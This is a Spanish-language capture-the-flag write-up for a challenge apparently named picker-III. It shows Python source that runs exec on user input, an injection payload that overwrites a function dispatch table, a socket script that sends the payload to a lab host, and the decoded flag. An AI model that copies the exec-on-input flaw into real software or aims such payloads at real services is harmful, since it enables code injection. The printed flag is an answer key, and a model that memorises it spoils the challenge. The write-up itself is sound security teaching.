## Descripción
Can you figure out how this program works to get the flag?

## Solución
- Analizamos el código fuente proporcionado en `picker-III.py`:
  ```python
  FUNC_TABLE_SIZE = 4
  FUNC_TABLE_ENTRY_SIZE = 32

  def reset_table():
    global func_table
    func_table = \
  '''\
  print_table                     \
  read_variable                   \
  write_variable                  \
  getRandomNumber                 \
  '''

  def check_table():
    global func_table
    if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
      return False
    return True

  def get_func(n):
    ...
    func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
    for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
      if( func_table[i] == ' '):
        func_name = func_table[func_name_offset:i]
        break
    ...
    return func_name

  def call_func(n):
    ...
    func_name = get_func(n)
    eval(func_name+'()')
  ```
- El programa pretende restringir la ejecución a 4 funciones permitidas registradas en una tabla global de funciones (`func_table`), la cual consiste en una cadena de $4 \times 32 = 128$ caracteres.
- Sin embargo, la función 3 de la tabla es `write_variable()`:
  ```python
  def filter_value(value):
    if ';' in value or '(' in value or ')' in value:
      return False
    else:
      return True

  def write_variable():
    var_name = input('Please enter variable name to write: ')
    if( filter_var_name(var_name) ):
      value = input('Please enter new value of variable: ')
      if( filter_value(value) ):
        exec('global '+var_name+'; '+var_name+' = '+value)
  ```
- Mediante `write_variable()`, el usuario puede reescribir cualquier variable global, incluyendo la propia tabla `func_table`, siempre que el valor no contenga `;`, `(` ni `)`:
  - `var_name`: `func_table`
  - `value`: `"win" + " " * 125` (genera una cadena válida de longitud 128 sin usar paréntesis ni caracteres prohibidos).
- Una vez sobrescrita `func_table` con `"win"`, al seleccionar la opción `1` (que ejecuta la primera función de la tabla, `call_func(0)`), el programa invoca `get_func(0)` obteniendo `"win"` y ejecuta `win()`.
- Automatizamos la interacción mediante un script en Python conectándonos a xebec.cylabacademy.net:43134`:
  ```python
  import socket, time

  s = socket.create_connection(("xebec.cylabacademy.net", 43134), timeout=5)
  s.recv(1024)

  # 1. Seleccionar la opción 3 (write_variable)
  s.sendall(b"3\n")
  time.sleep(0.2)
  s.recv(1024)

  # 2. Variable a sobrescribir: func_table
  s.sendall(b"func_table\n")
  time.sleep(0.2)
  s.recv(1024)

  # 3. Nuevo valor: "win" + " " * 125 (longitud 128)
  s.sendall(b'"win" + " " * 125\n')
  time.sleep(0.2)
  s.recv(1024)

  # 4. Invocar la primera función (win)
  s.sendall(b"1\n")
  time.sleep(0.3)
  resp = s.recv(4096).decode(errors="ignore")
  s.close()
  print(resp)
  ```
- La respuesta del servidor entrega los valores en hexadecimal:
  ```text
  0x61 0x63 0x61 0x64 0x65 0x6d 0x79 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x33 0x65 0x35 0x37 0x65 0x35 0x35 0x38 0x7d
  ```
- Decodificando los bytes hexadecimales a texto ASCII:
  ```python
  hex_vals = "0x61 0x63 0x61 0x64 0x65 0x6d 0x79 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x33 0x65 0x35 0x37 0x65 0x35 0x35 0x38 0x7d"
  flag = "".join(chr(int(h, 16)) for h in hex_vals.split())
  print(flag)
  ```
- Obtenemos la bandera:
```text
academy{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_3e57e558}
```

## Notas Adicionales
- El diseño pretendía simular una tabla de despacho de funciones (*function dispatch table* o tabla de vectores de salto) con un tamaño estricto de 128 caracteres.
- Al permitir que los usuarios modifiquen variables globales arbitrarias mediante `write_variable()`, la integridad del flujo de control (*Control Flow Integrity - CFI*) se ve totalmente comprometida.
- Herramientas utilizadas:
  - Python `socket` para la interacción automatizada con el servicio remoto.

## Referencias
- [Control Flow Integrity (CFI) Principles](https://en.wikipedia.org/wiki/Control-flow_integrity)
- [CWE-96: Improper Neutralization of Directives in Statically Saved Code](https://cwe.mitre.org/data/definitions/96.html)
